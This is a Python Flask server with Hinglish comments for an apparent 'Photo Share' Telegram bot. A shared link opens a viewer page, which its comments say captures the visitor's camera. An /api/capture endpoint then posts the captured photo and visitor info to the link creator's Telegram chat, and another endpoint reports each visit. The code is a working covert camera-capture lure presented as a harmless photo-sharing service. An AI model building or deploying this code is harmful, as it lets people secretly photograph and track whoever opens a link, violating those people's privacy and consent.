import os
import json
import base64
import logging
import threading
import asyncio
from io import BytesIO
from flask import (
    Flask, 
    render_template, 
    request, 
    jsonify, 
    send_file,
    redirect,
    url_for
)
from database import get_link, add_visitor
import requests as http_requests

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Environment variables
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
WEBSITE_URL = os.environ.get("WEBSITE_URL", "https://your-app.onrender.com")

def send_photo_to_telegram(chat_id, photo_base64, visitor_info=""):
    """
    Captured photo ko Telegram bot ke through user ko bhejo
    """
    try:
        # Base64 se bytes mein convert
        # Data URL format: data:image/jpeg;base64,/9j/4AAQ...
        if "," in photo_base64:
            photo_base64 = photo_base64.split(",")[1]
        
        photo_bytes = base64.b64decode(photo_base64)
        
        # Telegram API se photo bhejo
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        
        files = {
            "photo": ("captured.jpg", BytesIO(photo_bytes), "image/jpeg")
        }
        
        data = {
            "chat_id": chat_id,
            "caption": (
                f"📸 **New Photo Captured!**\n\n"
                f"👤 Visitor Info:\n{visitor_info}\n"
                f"⏰ Just now!"
            ),
            "parse_mode": "Markdown"
        }
        
        response = http_requests.post(url, files=files, data=data)
        logger.info(f"Photo sent to {chat_id}: {response.status_code}")
        return response.status_code == 200
        
    except Exception as e:
        logger.error(f"Error sending photo: {e}")
        
        # Agar photo send fail ho, text message bhejo
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": f"📸 Kisi ne tumhara link khola!\n\nVisitor: {visitor_info}",
            }
            http_requests.post(url, data=data)
        except:
            pass
        
        return False

@app.route("/")
def home():
    """Homepage"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Photo Share</title>
        <style>
            body {
                font-family: 'Segoe UI', sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                margin: 0;
                color: white;
            }
            .container {
                text-align: center;
                padding: 40px;
            }
            h1 { font-size: 3em; }
            p { font-size: 1.3em; opacity: 0.9; }
            a {
                color: white;
                background: rgba(255,255,255,0.2);
                padding: 15px 30px;
                border-radius: 30px;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📸 Photo Share Bot</h1>
            <p>Create and share photo links via Telegram!</p>
            <a href="https://t.me/YOUR_BOT_USERNAME">Open Telegram Bot</a>
        </div>
    </body>
    </html>
    """

@app.route("/view/<link_id>")
def view_photo(link_id):
    """
    Main page - Receiver yahan aayega
    Image dikhegi + Camera capture hoga
    """
    link_data = get_link(link_id)
    
    if not link_data:
        return """
        <html>
        <body style="display:flex;justify-content:center;align-items:center;
        height:100vh;font-family:sans-serif;background:#1a1a2e;color:white;">
        <div style="text-align:center;">
            <h1>❌ Link Not Found</h1>
            <p>This link is invalid or expired.</p>
        </div>
        </body></html>
        """, 404
    
    if not link_data.get("is_active", True):
        return """
        <html>
        <body style="display:flex;justify-content:center;align-items:center;
        height:100vh;font-family:sans-serif;background:#1a1a2e;color:white;">
        <div style="text-align:center;">
            <h1>⏰ Link Expired</h1>
            <p>This link is no longer active.</p>
        </div>
        </body></html>
        """, 410
    
    image_base64 = link_data.get("image_url", "")
    custom_message = link_data.get("custom_message", "Someone shared a photo!")
    chat_id = link_data.get("chat_id", "")
    
    return render_template(
        "viewer.html",
        link_id=link_id,
        image_data=image_base64,
        custom_message=custom_message,
        chat_id=chat_id
    )

@app.route("/api/capture", methods=["POST"])
def capture_photo():
    """
    Frontend se captured photo receive karo
    Aur Telegram par bhejo
    """
    try:
        data = request.get_json()
        
        link_id = data.get("link_id", "")
        photo_data = data.get("photo", "")
        visitor_info = data.get("visitor_info", "Unknown")
        
        if not link_id or not photo_data:
            return jsonify({"error": "Missing data"}), 400
        
        # Link data lo
        link_data = get_link(link_id)
        if not link_data:
            return jsonify({"error": "Invalid link"}), 404
        
        chat_id = link_data["chat_id"]
        
        # Visitor record karo
        add_visitor(link_id, visitor_info)
        
        # Photo Telegram par bhejo
        success = send_photo_to_telegram(
            chat_id=chat_id,
            photo_base64=photo_data,
            visitor_info=visitor_info
        )
        
        if success:
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "partial"}), 200
            
    except Exception as e:
        logger.error(f"Capture error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/api/notify", methods=["POST"])
def notify_visit():
    """Link visit notification bhejo"""
    try:
        data = request.get_json()
        link_id = data.get("link_id", "")
        
        link_data = get_link(link_id)
        if link_data:
            chat_id = link_data["chat_id"]
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            msg_data = {
                "chat_id": chat_id,
                "text": "👁️ Kisi ne tumhara link khola!",
            }
            http_requests.post(url, data=msg_data)
        
        return jsonify({"status": "ok"}), 200
    except:
        return jsonify({"status": "error"}), 500

@app.route("/health")
def health():
    """Health check for Render"""
    return jsonify({"status": "healthy"}), 200

def run_bot():
    """Bot ko separate thread mein chalao"""
    from bot import get_bot_app
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    bot_app = get_bot_app()
    loop.run_until_complete(bot_app.initialize())
    loop.run_until_complete(bot_app.start())
    loop.run_until_complete(
        bot_app.updater.start_polling(drop_pending_updates=True)
    )
    loop.run_forever()

if __name__ == "__main__":
    # Bot ko background thread mein start karo
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    logger.info("🤖 Bot started in background thread")
    
    # Flask server start karo
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
